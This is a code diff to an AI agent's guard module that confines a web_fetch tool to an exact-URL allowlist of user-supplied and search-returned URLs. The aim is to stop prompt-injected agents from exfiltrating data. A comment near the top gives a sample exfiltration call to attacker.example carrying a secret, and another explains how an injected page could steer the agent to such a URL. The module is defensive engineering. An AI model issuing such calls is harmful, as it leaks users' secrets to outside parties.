@@ -230,17 +230,25 @@ export function scrubbedAgentEnv(env: Record<string, string | undefined>, opts: 
   return out
 }
 
-// ── WebFetch ────────────────────────────────────────────────────────────────
+// ── web_fetch ────────────────────────────────────────────────────
 //
 // With the file tools confined, the remaining way for a prompt-injected agent to
-// get data off the box is a URL it chooses: `WebFetch https://attacker.example/?d=<secret>`
+// get data off the box is a URL it chooses: `web_fetch https://attacker.example/?d=<secret>`
 // (the path works just as well as the query). A host allowlist cannot express
 // "whatever the user asked about", and a no-query rule still leaks through the
-// path. So WebFetch is limited to URLs that were not invented by the model:
+// path. So fetching is limited to URLs that were not invented by the model:
+//
+// The exact-URL allowlist gates the Compass-hosted `web_fetch` MCP tool (see WEB_FETCH_TOOL_MATCHER). The SDK's
+// built-in WebFetch is not offered to the model at all (the entry script disallows it), so it has no hook.
 //
 //   - URLs that appear in the conversation text the user (or the replayed
 //     history) supplied, and
 //   - URLs returned by the Compass-hosted web_search tool in this very turn.
+//
+// URLs that appear only inside a web_fetch RESULT are deliberately NOT collected: a fetched
+// page is attacker-controllable text, and letting it extend the allowlist would let an injected
+// page walk the agent to a URL that carries data out. The user can still paste such a URL
+// in a later message, which seeds the next turn's list.
 //
 // Matching is exact on the normalized URL, so an allowed URL cannot be extended
 // with appended data. This keeps "read the page I named" and "follow a search
@@ -249,7 +257,7 @@ export function scrubbedAgentEnv(env: Record<string, string | undefined>, opts: 
 const URL_PATTERN = /https?:\/\/[^\s<>"'\u0060)\]}\\]+/gi
 const MAX_ALLOWED_URLS = 500
 
-/** The canonical form used to compare URLs, or null for anything WebFetch should never see. */
+/** The canonical form used to compare URLs, or null for anything web_fetch should never see. */
 export function normalizeFetchUrl(value: unknown): string | null {
   if (typeof value !== "string") return null
   if (value !== value.trim() || CONTROL_CHARS.test(value)) return null
@@ -283,17 +291,17 @@ export function createAllowedUrls(seedText: string): Set<string> {
 export function checkWebFetch(toolInput: unknown, allowed: ReadonlySet<string>): GuardDecision {
   const url = toolInput && typeof toolInput === "object" ? (toolInput as Record<string, unknown>).url : undefined
   const normalized = normalizeFetchUrl(url)
-  if (!normalized) return { allowed: false, reason: "Blocked: WebFetch needs a plain http(s) URL." }
+  if (!normalized) return { allowed: false, reason: "Blocked: fetching needs a plain http(s) URL." }
   if (!allowed.has(normalized)) {
     return {
       allowed: false,
-      reason: "Blocked: WebFetch only opens URLs the user gave you or that web_search returned in this conversation. Use web_search to find the page.",
+      reason: "Blocked: web_fetch only opens URLs the user gave you or that web_search returned in this conversation. Use web_search to find the page.",
     }
   }
   return { allowed: true }
 }
 
-/** PreToolUse hook for WebFetch. */
+/** PreToolUse hook for the Compass-hosted web_fetch tool. */
 export function createWebFetchPreToolUseHook(allowed: ReadonlySet<string>) {
   return async function webFetchPreToolUse(input: unknown): Promise<Record<string, unknown>> {
     let decision: GuardDecision
@@ -324,7 +332,10 @@ export function createSearchResultCollector(allowed: Set<string>) {
   }
 }
 
-export const WEB_FETCH_MATCHER = "WebFetch"
+// The Compass-hosted fetch server is registered as `web_fetch` and exposes one tool, `web_fetch`, so the
+// model-facing name is `mcp__web_fetch__web_fetch`. As with WEB_SEARCH_MATCHER, the `.*` makes this a regex
+// covering every tool on that server, which also keeps a second tool added to it later behind the same gate.
+export const WEB_FETCH_TOOL_MATCHER = "mcp__web_fetch__.*"
 // The Compass-hosted search server is registered as `web_search` and exposes one tool,
 // `web_search`, so the model-facing name is `mcp__web_search__web_search`. A hook matcher made
 // only of [A-Za-z0-9_|] is an EXACT tool name, so the bare server prefix never matched anything;
